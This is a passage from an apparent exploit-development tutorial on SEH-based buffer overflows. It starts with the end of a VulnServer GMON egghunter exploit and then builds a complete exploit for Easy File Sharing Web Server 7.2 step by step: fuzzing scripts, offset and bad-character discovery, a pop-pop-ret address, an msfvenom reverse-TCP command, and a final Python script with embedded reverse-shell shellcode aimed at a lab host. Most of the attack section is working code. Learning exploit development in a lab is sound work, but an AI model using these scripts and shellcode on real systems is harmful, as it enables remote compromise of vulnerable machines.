"\xc2\xf3\x83\x0f\x3d\xfc\xf3\x06\xfa\xa8\xa3\x30\x2b\xd1\x2f"
"\xc0\xd4\x04\xff\x90\x7a\xf7\x40\x40\x3b\xa7\x28\x8a\xb4\x98"
"\x49\xb5\x1e\xb1\xe0\x4c\xc9\x12\xe4\x44\xa2\x03\x07\x58\xb5"
"\x68\x8e\xbe\xdf\x9e\xc7\x69\x48\x06\x42\xe1\xe9\xc7\x58\x8c"
"\x2a\x43\x6f\x71\xe4\xa4\x1a\x61\x91\x44\x51\xdb\x34\x5a\x4f"
"\x73\xda\xc9\x14\x83\x95\xf1\x82\xd4\xf2\xc4\xda\xb0\xee\x7f"
"\x75\xa6\xf2\xe6\xbe\x62\x29\xdb\x41\x6b\xbc\x67\x66\x7b\x78"
"\x67\x22\x2f\xd4\x3e\xfc\x99\x92\xe8\x4e\x73\x4d\x46\x19\x13"
"\x08\xa4\x9a\x65\x15\xe1\x6c\x89\xa4\x5c\x29\xb6\x09\x09\xbd"
"\xcf\x77\xa9\x42\x1a\x3c\xc9\xa0\x8e\x49\x62\x7d\x5b\xf0\xef"
"\x7e\xb6\x37\x16\xfd\x32\xc8\xed\x1d\x37\xcd\xaa\x99\xa4\xbf"
"\xa3\x4f\xca\x6c\xc3\x45")


buffer = "A" * (3515-len(egg + shellcode))
print "[*] Adding Egghunter tag " + egg + " alongside A Buffer"
buffer += egg
buffer += shellcode
print "[*] Starting to Fuzz GMON with %s bytes" %len(buffer) + " A's"
buffer += nseh
print "[*] Overwriting nSEH Value with " + nseh
buffer += seh #0x625010br pop,pop,ret
print "[*] Overwriting SEH Value with " + seh
buffer += eggnops
buffer += egghunter
junk = "J"*(5000-len(buffer))
buffer += junk #Bunch of D"s to fill remaining space

print "[*] Starting to Fuzz GMON with everything containing %s bytes" %len(buffer)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('bof.local',9999))
print "[*] Connected to bof.local on Port 9999"
s.send(('GMON /.:/' + buffer))
s.close()
print "[*] Finished Fuzzing GMON with %s bytes" %len(buffer)
```





Providing we have a listener open on `443` we will receive a reverse shell back - It's worth noting here that this will **ONLY** work on `Windows 7 x86` this is due to the way the Egghunter initiates system calls, namely `INT 2E` - It is slightly different across architecture so our **mona** Egghunter will only work on  `32 Bit`





I decided to create this little diagram to represent the exploit from a high level and try to show each relevant jump - My visio skills aren't that great so excuse me! 





<p align = "center">
<img src = "https://i.imgur.com/CrUk3bd.png">
</p>





## Easy File Sharing Web Server 7.2 w/o Egghunter



Easy File Sharing Web Server is a legacy piece of software from Win XP / Win 7 era which allowed visitors to upload/download files easily through a web browser of there choosing,  despite it's usefulness at the time it was littered with numerous vulnerabilities from **Stack Overflows** to **SEH Overflows**.





### Fuzzing & Finding the Crash



Similar to previous examples I am going to stick the *fuzzing* stage as I do not want to spend lots of time fuzzing each input/parameter, that being said in this example we will be targeting the **HTTP** protocol and `boozfuzz` supports **HTTP** fuzzing, so check that out! I will be making a sole article soon purely on fuzzing and different techniques.



As the vulnerability lies within **HTTP** there are a couple ways to do this with python,we could use the `requests` library or we can just connect over Port 80 and send raw **HTTP requests.** - I will go for the Port 80 / Raw Requests here and maybe rewrite the script with `requests` at the end.



Let's first start off with a basic FUZZ script incrementing in size until we get a crash, here the vulnerability lies within the `GET` variable in which the underlying application tries to fetch the input passed alongside `GET` and fails to carry our bounds checking and any sanitization etc. 



This is an example HTTP request which we will send with python



```http
GET /m0chan.txtAAAAAAAAAbufferhereAAAAAAA HTTP/1.1
Host: 172.16.10.15
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: SESSIONID=5905; UserID=; PassWD=
If-Modified-Since: Fri, 11 May 2012 10:11:48 GMT
Connection: close
```



As you can see on **Line 1** we are requesting `m0chan.txt` alongside what will be our buffer/pattern. - Let's quickly write a little python script to make this a little simpler.



```python
#!/usr/bin/python
import socket
import sys
import string

buffer = "A" * 5000


payload = "GET %d" + str(buffer) + " HTTP/1.1\r\n"
payload += "Host: bof.local\r\n"
payload += "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n"
payload += "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"


print "[*] Starting to Fuzz GET Variable with %s bytes" %len(payload)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('bof.local',80))
print "[*] Connected to bof.local on Port 80"
s.send((payload))
s.close()
print "[*] Finished Fuzzing GET Variable with %s bytes" %len(payload)
```



 Once this has finished running providing we have `EFSWS` open in **Immunity** and/or attached we will notice that we have in fact caused a crash, let's analyze the screenshot below and see what we have done.




<p align = "center">
<img src = "https://i.imgur.com/8OQY9ZT.png">
</p>



As you can see we have overrun the address of **nSEH** and **SEH** both with user supplied input, in this case `AAAA` `41414141` - We have also over run something new to us as well... the **EAX Register** - As you can see top right `EAX` contains `41414141` which is our `A` buffer. - This may come in useful later. 

 





### Finding the Offset



As we have now analyzed the crash and found the *vulnerability* we can proceed to calculate the offset and work out how many `A's` it takes for us to over run the **SEH** and **nSEH** pointer. I will use **mona** for this with the below command to calculate a non-repeating string aka **cyclic pattern**.



```python
!mona pc 5000
```



I will now use my `fuzzer.py` script again and amend it to send my pattern instead `5000` `A's`



```python
#!/usr/bin/python
import socket
import sys
import string

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6...."


payload = "GET %d" + str(buffer) + " HTTP/1.1\r\n"
payload += "Host: bof.local\r\n"
payload += "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n"
payload += "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"


print "[*] Starting to Fuzz GET Variable with %s bytes" %len(payload)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('bof.local',80))
print "[*] Connected to bof.local on Port 80"
s.send((payload))
s.close()
print "[*] Finished Fuzzing GET Variable with %s bytes" %len(payload)
```



Our application will now return to a crashed state and report a **Access Violation** but if we check **SEH Chain** and jump to the value of **SE Handler** on the stack we will notice that it is in fact overrun with our cycling pattern and not a long string of `A's`



```python
!mona findmsp
```

```
!mona po 3Ff4
```



Running either of the above commands will report that the offset to over run the **nSEH** value is **4061 Bytes** - We can now amend our exploit to reflect `"A" * 4061`




<p align = "center">
<img src = "https://i.imgur.com/KTyiqOU.png">
</p>





### Finding Bad Chars



Here we will employ the same methods as above, in which we will send every possible character alongside our buffer and analyze how they display in the memory dump - It's also worth noting here that we will have to exclude the chars for `\n` & `\r` as we do not want to send carridge returns and new lines alongside our buffer effectively breaking up the raw **HTTP request**.



I will use the below script here. 



```python
#!/usr/bin/python
import socket
import sys


nseh = "B"*4
seh = "C"*4


badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


buffer = "A" * (4061-len(badchars))
print "[*] There are %s" %len(badchars) + " bad chars to test"
print "[*] Starting to GET Variable"
buffer += badchars #All of badchars
buffer += nseh #BBBB
buffer += seh #CCCC
junk = "D"*(5000-len(buffer))
buffer += junk #Bunch of D"s to fill remaining space

payload = "GET %d" + str(buffer) + " HTTP/1.1\r\n"
payload += "Host: bof.local\r\n"
payload += "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n"
payload += "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"


print "[*] Starting to Fuzz GET Variable with %s bytes" %len(payload)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('bof.local',80))
print "[*] Connected to bof.local on Port 80"
s.send((payload))
s.close()
print "[*] Finished Fuzzing GET Variable with %s bytes" %len(payload)
```





Providing we rinse-repeat this and find all the dead characters in memory dump we will find what we need, in this case my findings were

```bash
\x00\x0d\x0a\x0c\x20\x25\x2b\x2f\x5c
```







### Finding POP POP RET Instruction





As I have already covered this extensively throughout this article I will jump straight into the action and find a module that contains a `pop pop ret` instruction.



Of course once again we will use **mona** to accomplish this with the handy command below



```python
!mona seh
```



Of course here the goal is to find a module that was not compiled with any security restrictions such as **ASLR**, **Safe SEH** etc.



You will notice that when running `!mona seh` it displays 10 results in the log window and none of them are really suitable and it's easy to get confused here and start wondering if there is even a module to use. However! If you check the `seh.txt` file located in the working directory of **mona** you will find a very large `.txt` file that contains hundreds, maybe even thousands of usable modules.



In my case I scrolled past all the modules starting with `00` to avoid inadvertently implementing a rogue **null-byte** in my buffer.



My chosen option was `0x1000108b`



<p align = "center">
<img src = "https://i.imgur.com/G5xGWRw.png">
</p>



I now added this value to my **SEH** variable in my python script and executed it to verify that my thinking was right and execution was flowing as expected.



**Updated Python Script**



```python
#!/usr/bin/python
import socket
import sys


nseh = "B"*4
seh = "\x99\xab\x01\x10" #0x1001ab99 pop pop ret


buffer = "A" * 4061
print "[*] Starting to GET Variable"
buffer += nseh #BBBB
buffer += seh #pop pop ret
junk = "D"*(10000-len(buffer))
buffer += junk #Bunch of D"s to fill remaining space

payload = "GET %d" + str(buffer) + " HTTP/1.1\r\n"
payload += "Host: bof.local\r\n"
payload += "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n"
payload += "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"


print "[*] Starting to Fuzz GET Variable with %s bytes" %len(payload)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('bof.local',80))
print "[*] Connected to bof.local on Port 80"
s.send((payload))
s.close()
print "[*] Finished Fuzzing GET Variable with %s bytes" %len(payload)
```





Checking **Immunity** after execution displays that **SEH Handler** is now overwritten with the memory address of our `pop pop ret` gadget aka ***1001ab99***




<p align = "center">
<img src = "https://i.imgur.com/UfjG7qp.png">
</p>







And if we not pass the exception to the program with **Shift+F9** we will `pop pop ret` and the value of **nSEH** will be placed in the **EIP Register** ready for execution. **Bingo!**



In this case ***053A6FAC*** is the address of **nSEH** on the stack, so whatever we place in this location will be executed. As show in the below screenshot.






<p align = "center">
<img src = "https://i.imgur.com/taF7iSJ.png">
</p>







### Generating Shellcode



Now unlike VulnServer where we had very limited space to work with **AFTER** the buffer - **52 Bytes** to be precise in our case here we have a lot of room after our **nSEH** & **SEH** values, **931 Bytes** to be precise. 



Now providing we encode our shell code a little bit we should be able to just put our shellcode here and jump straight into this with a little `Short JMP` in our **nSEH** pointer. 



But, first let's generate some shellcode using trusty **MSFVenom** 



```bash
m0chan@kali:/> msfvenom -p windows/shell/reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x0d\x0a\x0c"
```



You may noticed I have went for a staged payload this time in comparison to a stageless just to help lower the payload size a little more.





### Final Exploit



Jumping to shell code and executing the final shellcode. All this is left to do now is place our shell code inside our `D` buffer alongside some `NOPS` for safety and execute a **6 Byte** jump from **nSEH** which will land in our NOP Sled and straight into shellcode.



We can do this with



```python
nseh = "\xeb\x06\x90\x90"
```



Our final exploit will now look something like this



```python
#!/usr/bin/python
import socket
import sys


nseh = "\xeb\x06\x90\x90"
seh = "\x99\xab\x01\x10" #0x1001ab99 pop pop ret

#msfvenom -p windows/shell/reverse_tcp LHOST=172.16.10.171 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x0d\x0a\x0c\x20\x25\x2b\x2f\x5c"

shellcodenops = "\x90\x90\x90\x90"


shellcode = (
"\xbd\xe0\x3c\x1c\xcb\xda\xc2\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x5b\x31\x6a\x14\x83\xea\xfc\x03\x6a\x10\x02\xc9\xe0\x23\x40"
"\x32\x19\xb4\x24\xba\xfc\x85\x64\xd8\x75\xb5\x54\xaa\xd8\x3a"
"\x1f\xfe\xc8\xc9\x6d\xd7\xff\x7a\xdb\x01\x31\x7a\x77\x71\x50"
"\xf8\x85\xa6\xb2\xc1\x46\xbb\xb3\x06\xba\x36\xe1\xdf\xb1\xe5"
"\x16\x6b\x8f\x35\x9c\x27\x1e\x3e\x41\xff\x21\x6f\xd4\x8b\x78"
"\xaf\xd6\x58\xf1\xe6\xc0\xbd\x3f\xb0\x7b\x75\xb4\x43\xaa\x47"
"\x35\xef\x93\x67\xc4\xf1\xd4\x40\x36\x84\x2c\xb3\xcb\x9f\xea"
"\xc9\x17\x15\xe9\x6a\xdc\x8d\xd5\x8b\x31\x4b\x9d\x80\xfe\x1f"
"\xf9\x84\x01\xf3\x71\xb0\x8a\xf2\x55\x30\xc8\xd0\x71\x18\x8b"
"\x79\x23\xc4\x7a\x85\x33\xa7\x23\x23\x3f\x4a\x30\x5e\x62\x03"
"\xf5\x53\x9d\xd3\x91\xe4\xee\xe1\x3e\x5f\x79\x4a\xb7\x79\x7e"
"\xdb\xdf\x79\x50\x63\x8f\x87\x51\x94\x86\x43\x05\xc4\xb0\x62"
"\x26\x8f\x40\x8a\xf3\x3a\x4a\x1c\x50\xaa\x40\x77\xc0\xc9\x54"
"\x86\xaa\x47\xb2\xd8\x9c\x07\x6a\x99\x4c\xe8\xda\x71\x87\xe7"
"\x05\x61\xa8\x2d\x2e\x08\x47\x98\x07\xa5\xfe\x81\xd3\x54\xfe"
"\x1f\x9e\x57\x74\xaa\x5f\x19\x7d\xdf\x73\x4e\x1a\x1f\x8b\x8f"
"\x8f\x1f\xe1\x8b\x19\x77\x9d\x91\x7c\xbf\x02\x69\xab\xc3\x44"
"\x95\x2a\xf2\x3f\xa0\xb8\xba\x57\xcd\x2c\x3b\xa7\x9b\x26\x3b"
"\xcf\x7b\x13\x68\xea\x83\x8e\x1c\xa7\x11\x31\x75\x14\xb1\x59"
"\x7b\x43\xf5\xc5\x84\xa6\x85\x02\x7a\x35\xa2\xaa\x13\xc5\xf2"
"\x4a\xe4\xaf\xf2\x1a\x8c\x24\xdc\x95\x7c\xc5\xf7\xfd\x14\x4c"
"\x96\x4c\x84\x51\xb3\x11\x18\x52\x30\x8a\xab\x29\x39\x2d\x4c"
"\xce\x53\x4a\x4c\xcf\x5b\x6c\x70\x06\x62\x1a\xb7\x9b\xd1\x05"
"\x2a\x31\x2c\xae\xf3\xd0\x8d\xb3\x03\x0f\xd1\xcd\x87\xa5\xaa"
"\x29\x97\xcc\xaf\x76\x1f\x3d\xc2\xe7\xca\x41\x71\x07\xdf")

buffer = "A" * 4061
print "[*] Starting to GET Variable"
buffer += nseh #BBBB
buffer += seh #pop pop ret
buffer += shellcodenops
buffer += shellcode
junk = "D"*(10000-len(buffer))
buffer += junk #Bunch of D"s to fill remaining space

payload = "GET %d" + str(buffer) + " HTTP/1.1\r\n"
payload += "Host: bof.local\r\n"
payload += "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36\r\n"
payload += "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"


print "[*] Starting to Fuzz GET Variable with %s bytes" %len(payload)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('bof.local',80))
print "[*] Connected to bof.local on Port 80"
s.send((payload))
s.close()
print "[*] Finished Fuzzing GET Variable with %s bytes" %len(payload)
```





Similar to **VulnServer** - I also created a nice little diagram in Visio to demonstrate the exploit and jumps from a high level.




<p align = "center">
<img src = "https://i.imgur.com/crUGyBR.png">
</p>







# References / Resources



Special Shoutout to all the People Below:

[https://h0mbre.github.io](https://h0mbre.github.io/)

[https://www.securitysift.com](https://www.securitysift.com/)

[https://captmeelo.com](https://captmeelo.com/)

[https://www.fuzzysecurity.com](https://www.fuzzysecurity.com/)

[https://securitychops.com](https://securitychops.com/)

https://nutcrackerssecurity.github.io/Windows4.html